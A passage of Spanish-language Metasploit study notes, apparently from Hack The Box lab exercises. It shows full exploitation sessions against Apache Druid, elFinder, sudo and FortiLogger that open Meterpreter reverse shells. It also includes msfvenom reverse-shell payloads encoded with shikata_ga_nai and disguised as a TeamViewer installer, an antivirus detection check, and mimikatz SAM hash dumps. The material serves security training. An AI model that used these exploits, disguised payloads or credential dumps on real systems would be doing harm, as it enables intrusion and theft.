msf6 exploit(linux/http/apache_druid_js_rce) > set RHOSTS 10.129.220.12
RHOSTS => 10.129.220.12
msf6 exploit(linux/http/apache_druid_js_rce) > run
[*] Started reverse TCP handler on 10.10.14.185:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://10.10.14.185:8080/OUUhApkFM6
[*] Client 10.129.220.12 (curl/7.68.0) requested /OUUhApkFM6
[*] Sending payload to 10.129.220.12 (curl/7.68.0)
[*] Sending stage (3045380 bytes) to 10.129.220.12
[*] Meterpreter session 1 opened (10.10.14.185:4444 -> 10.129.220.12:37526) at 2025-01-28 13:23:21 +0100
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: root
meterpreter > ls
Listing: /root/druid
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  59403  fil   2020-03-31 03:52:05 +0200  LICENSE
100644/rw-r--r--  69091  fil   2020-03-31 03:52:06 +0200  NOTICE
100644/rw-r--r--  8228   fil   2020-03-31 03:54:43 +0200  README
040755/rwxr-xr-x  4096   dir   2022-05-16 10:45:00 +0200  bin
040755/rwxr-xr-x  4096   dir   2022-05-11 14:49:31 +0200  conf
040755/rwxr-xr-x  4096   dir   2022-05-11 14:49:30 +0200  extensions
040755/rwxr-xr-x  4096   dir   2022-05-11 14:49:30 +0200  hadoop-dependencies
040755/rwxr-xr-x  12288  dir   2022-05-11 14:49:32 +0200  lib
040755/rwxr-xr-x  4096   dir   2020-03-31 03:26:02 +0200  licenses
040755/rwxr-xr-x  4096   dir   2022-05-11 14:49:31 +0200  quickstart
040755/rwxr-xr-x  4096   dir   2022-05-11 15:09:18 +0200  var

meterpreter > cd ..
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  168   fil   2022-05-16 13:07:41 +0200  .bash_history
100644/rw-r--r--  3137  fil   2022-05-11 15:43:25 +0200  .bashrc
040700/rwx------  4096  dir   2022-05-16 13:04:45 +0200  .cache
040700/rwx------  4096  dir   2022-05-16 12:54:48 +0200  .config
100644/rw-r--r--  161   fil   2019-12-05 15:39:21 +0100  .profile
100644/rw-r--r--  75    fil   2022-05-16 10:45:33 +0200  .selected_editor
040700/rwx------  4096  dir   2021-10-06 19:37:09 +0200  .ssh
100644/rw-r--r--  212   fil   2022-05-11 16:10:43 +0200  .wget-hsts
040755/rwxr-xr-x  4096  dir   2022-05-11 14:51:45 +0200  druid
100755/rwxr-xr-x  95    fil   2022-05-16 12:31:10 +0200  druid.sh
100644/rw-r--r--  22    fil   2022-05-16 12:01:15 +0200  flag.txt
040755/rwxr-xr-x  4096  dir   2021-10-06 19:37:19 +0200  snap

meterpreter > cat flag.txt
HTB{MSF_Expl01t4t10n}
```

## MSF encoders 

Tambíen es posible crear nuestros propios payloads mediante msfvenom.

> Este ejemplo es sin codificar.
{: .prompt-info }
```bash
pr0ff3@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
my $buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
"\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
"\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
"\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .
```

> Este ejemplo es codificado con shikata_ga_nai
{: .prompt-info }

```bash
pr0ff3@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"
```
Si os interesa saber más sobre la codificación shikata_ga_nai, puedes consultar el siguiente [enlace](https://hatching.io/blog/metasploit-payloads2/).

### Codificar payloads ya existentes

Se puede seleccionar un payload ya existente y codificarlo con msfconsole.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```
Si por ejemplo necesitamos inyectar un payload en un ejecutable:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```
Si quremos que la codficación se realice un numero determinad de veces, podemos hacerlo con el siguiente comando:

```bash
pr0ff3@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
### MSF Virus-Total

MSF cuenta con una función integrada para la detección de virus en archivos y así comprobar si nuestro payload es detectado como malicioso.

```bash
 msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

## Plugins

Mientras que antes necesitábamos alternar entre diferentes programas para importar y exportar resultados, configurando opciones y parámetros una y otra vez, ahora, con el uso de plugins, todo es automáticamente documentado por msfconsole en la base de datos que estamos usando y los hosts, servicios y vulnerabilidades están disponibles de un vistazo para el usuario. Los plugins trabajan directamente con la API y pueden ser usados para manipular todo el framework.

Para ver los plugins disponibles oficiales de msfconsole, podemos visitar la siguiente [página](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin).

Para listar los plugins disponibles en nuestro sistema:

```bash
ls /usr/share/metasploit-framework/plugins
```
### Instalar plugins

Por ejemplo si queremos instalar el plugin DarkOperator`s Metasploit-Plugins:

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
```
Navegamos a la carpeta y copiamos todos o los plugins que necesitemos a la carpeta de plugins de Metasploit.

```bash
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
### Cargar plugins

Para cargar los plugins de Metasploit, ejecutamos el siguiente comando:

```bash
msf6 > load pentest
```
### Algunos plugins

| Herramienta       | Enlace                                                                                       |
|-------------------|---------------------------------------------------------------------------------------------|
| NMAP              | [https://nmap.org/](https://nmap.org/)                                                     |
| Mimikatz          | [http://blog.gentilkiwi.com/mimikatz](http://blog.gentilkiwi.com/mimikatz)                 |
| Priv              | [https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb) |
| NexPose           | [https://sectools.org/tool/nexpose/](https://sectools.org/tool/nexpose/)                   |
| Stdapi            | [https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi) |
| Incognito         | [https://www.offensive-security.com/metasploit-unleashed/fun-incognito/](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/) |
| Nessus            | [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)         |
| Railgun           | [https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation) |
| DarksOperator     | [https://github.com/darkoperator/Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins) |


# Sesiones MSFconsole

MSFconsole es capaz de manejar diferentes modulos a la vez mediante el uso de sesiones.

Durante la ejecución de cualquier exploit o módulo auxiliar disponible en msfconsole, podemos enviar la sesión a segundo plano siempre que formen un canal de comunicación con el host objetivo. Esto se puede hacer ya sea presionando la combinación de teclas `[CTRL] + [Z]` o escribiendo el comando `background` en el caso de las etapas de Meterpreter.

> Ver sesiones activas
{: .prompt-info }

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions
```

> Seleccionar una sesión
{: .prompt-info }

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
```

## MSF sessions

### Jobs

Si estamos trabajando en con diferentes sesiones pero necesitamos utilizar un exploit en el mismo puerto que uno activo podemos usar el comando `jobs` para listar las tareas que se están ejecutando en la sesión actual.

```bash
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
```
### Ejemplo práctico

```bash
msf6 exploit(linux/http/apache_druid_js_rce) > search elFinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf6 exploit(linux/http/apache_druid_js_rce) > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 10.129.105.220
RHOSTS => 10.129.105.220
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.14.185
LHOST => 10.10.14.185
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run
[*] Started reverse TCP handler on 10.10.14.185:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file KQQHP.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive XMARuWh.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.14.185:8080/nFNGBu61
[*] Client 10.129.105.220 (Wget/1.20.3 (linux-gnu)) requested /nFNGBu61
[*] Sending payload to 10.129.105.220 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  50.91% done (56/110 bytes)
[*] Command Stager progress -  70.91% done (78/110 bytes)
[*] Sending stage (1017704 bytes) to 10.129.105.220
[+] Deleted KQQHP.txt
[+] Deleted XMARuWh.zip
[*] Meterpreter session 2 opened (10.10.14.185:4444 -> 10.129.105.220:49374) at 2025-01-28 14:03:13 +0100
[*] Command Stager progress -  82.73% done (91/110 bytes)
[*] Command Stager progress - 100.00% done (110/110 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: www-data
meterpreter > CTRL + Z
Background session 2? [y/N]  
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > sessions

Active sessions
===============

  Id  Name  Type                   Information                Connection
  --  ----  ----                   -----------                ----------
  2         meterpreter x86/linux  www-data @ 10.129.105.220  10.10.14.185:4444 -> 10.129.105.220:49374 (10.129.105.220)

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > search sudo 

Matching Modules
================

   #   Name                                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                                       ---------------  ----       -----  -----------
   60  exploit/linux/local/sudo_baron_samedit                                     2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   61    \_ target: Automatic                                                     .                .          .      .
   62    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                   .                .          .      .
   63    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative     .                .          .      .
   64    \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                   .                .          .      .
   65    \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                   .                .          .      .
   66    \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative     .                .          .      .
   67    \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   68    \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)                  .                .          .      .
   69    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                      .                .          .      .
   70    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative        .                .          .      .
   71    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                     .                .          .      .
   72    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                       .                .          .      .
   73    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative         .                .          .      .
   74    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                    .                .          .      .
   75    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                    .                .          .      .
   76    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                      .                .          .      .
   77    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                      .                .          .      .
   78    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                    .                .          .      .
   79    \_ target: Manual                                                        .                .          .      .

msf6 exploit(linux/http/elfinder_archive_cmd_injection) > use 60
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/sudo_baron_samedit) > options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.210  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 2
SESSION => 2
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST 10.10.14.185
LHOST => 10.10.14.185
msf6 exploit(linux/local/sudo_baron_samedit) > set LPORT 9000
LPORT => 9000
msf6 exploit(linux/local/sudo_baron_samedit) > run
[*] Started reverse TCP handler on 10.10.14.185:9000 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/djZHsBdVV.py' (763 bytes) ...
[*] Writing '/tmp/libnss_dqk6x/B .so.2' (548 bytes) ...
[*] Sending stage (3045380 bytes) to 10.129.105.220
[+] Deleted /tmp/djZHsBdVV.py
[+] Deleted /tmp/libnss_dqk6x/B .so.2
[+] Deleted /tmp/libnss_dqk6x
[*] Meterpreter session 3 opened (10.10.14.185:9000 -> 10.129.105.220:42176) at 2025-01-28 14:07:03 +0100

meterpreter > getuid
Server username: root
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  178    fil   2022-05-16 17:35:30 +0200  .bash_history
100644/rw-r--r--  3106   fil   2022-05-16 17:34:51 +0200  .bashrc
040700/rwx------  4096   dir   2022-05-16 15:46:07 +0200  .cache
040700/rwx------  4096   dir   2022-05-16 15:46:06 +0200  .config
040755/rwxr-xr-x  4096   dir   2022-05-16 15:46:07 +0200  .local
100644/rw-r--r--  161    fil   2019-12-05 15:39:21 +0100  .profile
100644/rw-r--r--  75     fil   2022-05-16 10:45:33 +0200  .selected_editor
040700/rwx------  4096   dir   2021-10-06 19:37:09 +0200  .ssh
100600/rw-------  13300  fil   2022-05-16 17:34:51 +0200  .viminfo
100644/rw-r--r--  291    fil   2022-05-16 15:51:29 +0200  .wget-hsts
100644/rw-r--r--  24     fil   2022-05-16 17:18:40 +0200  flag.txt
040755/rwxr-xr-x  4096   dir   2021-10-06 19:37:19 +0200  snap

meterpreter > cat flag.txt 
HTB{5e55ion5_4r3_sw33t}
```

## Meterpreter

```bash
msf6 exploit(linux/local/sudo_baron_samedit) > search FortiLogger

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload

msf6 exploit(linux/local/sudo_baron_samedit) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > options

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.210  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger < 5.2.0



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOSTS 10.129.239.92
RHOSTS => 10.129.239.92
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST 10.10.14.185
LHOST => 10.10.14.185
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > run
[*] Started reverse TCP handler on 10.10.14.185:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (177734 bytes) to 10.129.239.92
[*] Meterpreter session 4 opened (10.10.14.185:4444 -> 10.129.239.92:49693) at 2025-01-28 14:20:58 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-51BJ97BCIPV
SysKey : c897d22c1c56490b453e326f86b2eef8
Local SID : S-1-5-21-2348711446-3829538955-3974936019

SAMKey : e52d743c76043bf814df6e48f1efcb23

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e507b237b40a3a1f62ba1935465406

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 545c81812fc803221b22e47ab8789c104f38b151c677fbc4006894db6d174f1b
      aes128_hmac       (4096) : 5d59bcd0e74c5ed8951b9f2b658eef43
      des_cbc_md5       (4096) : 76436b1c190d892a
    OldCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
    OlderCredentials
      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
      des_cbc_md5       (4096) : d32592d63b75ec1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Credentials
      des_cbc_md5       : 76436b1c190d892a
    OldCredentials
      des_cbc_md5       : 9876615285c2766e


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5


RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f88979e2a6999b5cbc7a9308e7b4cd82

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1ed226feb91bfd21489a12a58c6cb38b99ab70feb30d971c8987fb44bcb15213
      aes128_hmac       (4096) : 629343148027bcf0d48cf49b066a9960
      des_cbc_md5       (4096) : 379791d616ef6d0e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Credentials
      des_cbc_md5       : 379791d616ef6d0e
```

# Características adicionales

## Crear e importar modulos

ExploitDB es una excelente opción cuando se busca un exploit personalizado. Podemos usar etiquetas para buscar a través de los diferentes escenarios de explotación para cada script disponible. Una de estas etiquetas es Metasploit Framework (MSF), que, si se selecciona, mostrará solo los scripts que también están disponibles en formato de módulo de Metasploit. Estos pueden ser descargados directamente desde ExploitDB e instalados en nuestro directorio local de Metasploit Framework, desde donde pueden ser buscados y llamados desde dentro de `msfconsole`.

Tenemos que descargar el archivo `.rb` y colocarlo en el directorio correcto. El directorio predeterminado donde se almacenan todos los módulos, scripts, plugins y archivos propietarios de `msfconsole` es `/usr/share/metasploit-framework`. Las carpetas críticas también están enlazadas simbólicamente en nuestras carpetas de inicio y root en la ubicación oculta `~/.msf4/`.

> Para buscar en ExploitDB, podemos usar la siguiente sintaxis:
{: .prompt-info }

```bash
searchsploit -t Nagios3 --exclude=".py"
```
Movemos los archivos `.rb` a la carpeta de módulos de Metasploit, y luego cargamos el módulo en `msfconsole` con el comando `load`.

```bash
msf6> loadpath /usr/share/metasploit-framework/modules/
```
o

```bash
msf6 > reload_all
```
### Importar módulos

Comenzamos seleccionando algún código de exploit para portarlo a Metasploit. En este ejemplo, iremos por Bludit 3.9.2 - Evasión de la Mitigación de Fuerza Bruta en la Autenticación. Necesitaremos descargar el script, `48746.rb` y proceder a copiarlo en la carpeta `/usr/share/metasploit-framework/modules/exploits/linux/http/`. Si iniciamos `msfconsole` ahora mismo, solo podremos encontrar un único exploit de `Bludit CMS` en la misma carpeta mencionada anteriormente, confirmando que nuestro exploit aún no ha sido portado. Es una buena noticia que ya haya un exploit de Bludit en esa carpeta porque lo usaremos como código base para nuestro nuevo exploit.

```bash
ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit

bludit_upload_images_exec.rb
```
```bash
cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```
### Crear módulos

Toda la información necesaria sobre la programación en Ruby para Metasploit se puede encontrar en la página relacionada con [Metasploit Framework en Rubydoc.info](https://www.rubydoc.info/github/rapid7/metasploit-framework). Desde escáneres hasta otras herramientas auxiliares, desde exploits personalizados hasta los portados, programar en Ruby para el Framework es una habilidad increíblemente aplicable.

## Vistazo rápido de MSFVenom

`MSFVenom` es el sucesor de `MSFPayload` y `MSFEncode`, dos scripts independientes que solían trabajar en conjunto con `msfconsole` para proporcionar a los usuarios cargas útiles altamente personalizables y difíciles de detectar para sus exploits.

`MSFVenom` es el resultado de la unión entre estas dos herramientas. Antes de esta herramienta, teníamos que canalizar (`|`) el resultado de `MSFPayload`, que se usaba para generar shellcode para una arquitectura de procesador y versión de sistema operativo específicos, hacia `MSFEncode`, que contenía múltiples esquemas de codificación utilizados tanto para eliminar caracteres incorrectos del shellcode (esto a veces podía causar inestabilidad durante la ejecución), como para evadir software más antiguo de Antivirus (`AV`) y de Prevención/Detección de Intrusiones (`IPS/IDS`) de punto final.

[Ver Cheatsheet MSFVenom](/assets/img/posts/metasploit/msfvenom_cheatsheet.pdf)

